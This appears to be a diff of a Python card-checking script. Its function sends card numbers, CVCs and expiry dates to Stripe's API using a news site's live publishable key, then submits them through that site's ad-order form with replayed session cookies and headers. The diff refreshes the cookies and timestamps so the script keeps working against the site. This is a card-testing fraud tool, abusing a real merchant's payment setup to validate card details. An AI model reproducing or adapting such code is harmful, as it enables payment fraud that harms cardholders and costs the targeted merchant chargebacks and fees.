@@ -25,36 +25,36 @@ def Tele(ccx):
         'sec-fetch-site': 'same-site',
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
     }
-	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F44098e0890%3B+stripe-js-v3%2F44098e0890%3B+card-element&referrer=https%3A%2F%2Fnews.dpgazette.com&time_on_page=78156&key=pk_live_51Ozkr9P3o1jZ9Xie1YDNdVUOtcjO80GY4I825jJlYcPmvWZk1GhHloRVAtEFHsM6f7NqTbNv6Tlx2jbi5ANsjjWl00mcNhcCSK'
-	
+    
+    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F44098e0890%3B+stripe-js-v3%2F44098e0890%3B+card-element&referrer=https%3A%2F%2Fnews.dpgazette.com&time_on_page=74526&key=pk_live_51Ozkr9P3o1jZ9Xie1YDNdVUOtcjO80GY4I825jJlYcPmvWZk1GhHloRVAtEFHsM6f7NqTbNv6Tlx2jbi5ANsjjWl00mcNhcCSK'
+    
     r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
     
     pm = r1.json()['id']
     
     cookies = {
         'advanced_ads_pro_visitor_referrer': '%7B%22expires%22%3A1768249261%2C%22data%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%7D',
+        '_gcl_au': '1.1.2097762215.1736713263',
+        '_ga': 'GA1.1.1871403871.1736713263',
+        '_pk_id.31.ba30': 'b59dc5848978a83e.1736713264.',
+        'advanced_ads_visitor': '%7B%22vc_cache_reset%22%3A0%7D',
+        '__stripe_mid': 'f8fb9aed-b2d1-4d3d-b8db-a0ded74736d7542aa2',
+        'fluentform_step_form_hash_9': 'c333db6a-1fd7-45a9-9fb7-1bd345a3cc6e',
+        'advanced_ads_page_impressions': '%7B%22expires%22%3A2052073261%2C%22data%22%3A3%7D',
         'sbjs_migrations': '1418474375998%3D1',
-        'sbjs_first_add': 'fd%3D2025-01-12%2020%3A21%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fnews.dpgazette.com%2Forder-display-ads%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+        'sbjs_current_add': 'fd%3D2025-01-12%2020%3A55%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fnews.dpgazette.com%2Forder-display-ads%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+        'sbjs_first_add': 'fd%3D2025-01-12%2020%3A55%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fnews.dpgazette.com%2Forder-display-ads%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
         'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
         'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
         'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-        '_gcl_au': '1.1.2097762215.1736713263',
-        '_ga': 'GA1.1.1871403871.1736713263',
-        '_pk_ref.31.ba30': '%5B%22%22%2C%22%22%2C1736713264%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
-        '_pk_id.31.ba30': 'b59dc5848978a83e.1736713264.',
+        'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fnews.dpgazette.com%2Forder-display-ads%2F',
+        '_ga_99ZLQ6952B': 'GS1.1.1736715306.2.0.1736715306.60.0.0',
+        '_pk_ref.31.ba30': '%5B%22%22%2C%22%22%2C1736715307%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
         '_pk_ses.31.ba30': '1',
         'tu-geoip-ajax': '%7B%22city%22%3A%22Bangkok%22%2C%22state%22%3A%22Bangkok%22%2C%22country%22%3A%22Thailand%22%7D',
         'tu-geoip-hide': 'true',
-        'advanced_ads_visitor': '%7B%22vc_cache_reset%22%3A0%7D',
-        '__stripe_mid': 'f8fb9aed-b2d1-4d3d-b8db-a0ded74736d7542aa2',
-        '__stripe_sid': '5b3a1083-59dd-460f-a55a-f9d2407e4f6d390a9b',
-        'fluentform_step_form_hash_9': 'c333db6a-1fd7-45a9-9fb7-1bd345a3cc6e',
-        'advanced_ads_page_impressions': '%7B%22expires%22%3A2052073261%2C%22data%22%3A2%7D',
-        'sbjs_current_add': 'fd%3D2025-01-12%2020%3A24%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fnews.dpgazette.com%2Forder-display-ads%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
-        'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fnews.dpgazette.com%2Forder-display-ads%2F',
-        '_ga_99ZLQ6952B': 'GS1.1.1736713262.1.1.1736713451.60.0.0',
-        'FCNEC': '%5B%5B%22AKsRol_oerkiNckKf3r1kGiy0RC2ciA9RPfkS6AbFsuLd-goZhklUAv6rCLV3yaO-jJkhTnHKsrqQA2ga7NiDAoNgQ9bAPo_P6YJZrSCpvD8kGVX0ua_F7Fi2P_Cx14WvThVUOy7soyszelw10rHEY-ABU6lCIwnww%3D%3D%22%5D%5D',
+        'FCNEC': '%5B%5B%22AKsRol8lllJNn2-Fk0-dBfZ4n3xyMnmK3dIA2y-jpIT_l3OBsefqddWpxRNEdZee3V_nVaESXBYTo5ta39FSzRVCJIbp-Xe95Lz3yvntV3kcixKFGJ-j8VYH8sZZhAOSYMl-dkT1emVZOxJQ6WuXFo01M7Tn-S1n4w%3D%3D%22%5D%5D',
+        '__stripe_sid': '9aff9de5-ce93-4dc9-839b-e40ff0bb3a441a5323',
     }
     
     headers = {
@@ -62,7 +62,7 @@ def Tele(ccx):
         'accept': '*/*',
         'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
         'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        # 'cookie': 'advanced_ads_pro_visitor_referrer=%7B%22expires%22%3A1768249261%2C%22data%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%7D; sbjs_migrations=1418474375998%3D1; sbjs_first_add=fd%3D2025-01-12%2020%3A21%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fnews.dpgazette.com%2Forder-display-ads%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _gcl_au=1.1.2097762215.1736713263; _ga=GA1.1.1871403871.1736713263; _pk_ref.31.ba30=%5B%22%22%2C%22%22%2C1736713264%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_id.31.ba30=b59dc5848978a83e.1736713264.; _pk_ses.31.ba30=1; tu-geoip-ajax=%7B%22city%22%3A%22Bangkok%22%2C%22state%22%3A%22Bangkok%22%2C%22country%22%3A%22Thailand%22%7D; tu-geoip-hide=true; advanced_ads_visitor=%7B%22vc_cache_reset%22%3A0%7D; __stripe_mid=f8fb9aed-b2d1-4d3d-b8db-a0ded74736d7542aa2; __stripe_sid=5b3a1083-59dd-460f-a55a-f9d2407e4f6d390a9b; fluentform_step_form_hash_9=c333db6a-1fd7-45a9-9fb7-1bd345a3cc6e; advanced_ads_page_impressions=%7B%22expires%22%3A2052073261%2C%22data%22%3A2%7D; sbjs_current_add=fd%3D2025-01-12%2020%3A24%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fnews.dpgazette.com%2Forder-display-ads%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fnews.dpgazette.com%2Forder-display-ads%2F; _ga_99ZLQ6952B=GS1.1.1736713262.1.1.1736713451.60.0.0; FCNEC=%5B%5B%22AKsRol_oerkiNckKf3r1kGiy0RC2ciA9RPfkS6AbFsuLd-goZhklUAv6rCLV3yaO-jJkhTnHKsrqQA2ga7NiDAoNgQ9bAPo_P6YJZrSCpvD8kGVX0ua_F7Fi2P_Cx14WvThVUOy7soyszelw10rHEY-ABU6lCIwnww%3D%3D%22%5D%5D',
+        # 'cookie': 'advanced_ads_pro_visitor_referrer=%7B%22expires%22%3A1768249261%2C%22data%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%7D; _gcl_au=1.1.2097762215.1736713263; _ga=GA1.1.1871403871.1736713263; _pk_id.31.ba30=b59dc5848978a83e.1736713264.; advanced_ads_visitor=%7B%22vc_cache_reset%22%3A0%7D; __stripe_mid=f8fb9aed-b2d1-4d3d-b8db-a0ded74736d7542aa2; fluentform_step_form_hash_9=c333db6a-1fd7-45a9-9fb7-1bd345a3cc6e; advanced_ads_page_impressions=%7B%22expires%22%3A2052073261%2C%22data%22%3A3%7D; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-01-12%2020%3A55%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fnews.dpgazette.com%2Forder-display-ads%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2025-01-12%2020%3A55%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fnews.dpgazette.com%2Forder-display-ads%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fnews.dpgazette.com%2Forder-display-ads%2F; _ga_99ZLQ6952B=GS1.1.1736715306.2.0.1736715306.60.0.0; _pk_ref.31.ba30=%5B%22%22%2C%22%22%2C1736715307%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.31.ba30=1; tu-geoip-ajax=%7B%22city%22%3A%22Bangkok%22%2C%22state%22%3A%22Bangkok%22%2C%22country%22%3A%22Thailand%22%7D; tu-geoip-hide=true; FCNEC=%5B%5B%22AKsRol8lllJNn2-Fk0-dBfZ4n3xyMnmK3dIA2y-jpIT_l3OBsefqddWpxRNEdZee3V_nVaESXBYTo5ta39FSzRVCJIbp-Xe95Lz3yvntV3kcixKFGJ-j8VYH8sZZhAOSYMl-dkT1emVZOxJQ6WuXFo01M7Tn-S1n4w%3D%3D%22%5D%5D; __stripe_sid=9aff9de5-ce93-4dc9-839b-e40ff0bb3a441a5323',
         'origin': 'https://news.dpgazette.com',
         'referer': 'https://news.dpgazette.com/order-display-ads/',
         'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
@@ -76,7 +76,7 @@ def Tele(ccx):
     }
     
     params = {
-        't': '1736713489653',
+        't': '1736715380878',
     }
     
     data = {
@@ -92,5 +92,5 @@ def Tele(ccx):
         headers=headers,
         data=data,
     )
-	
+
 	return (r2.json())
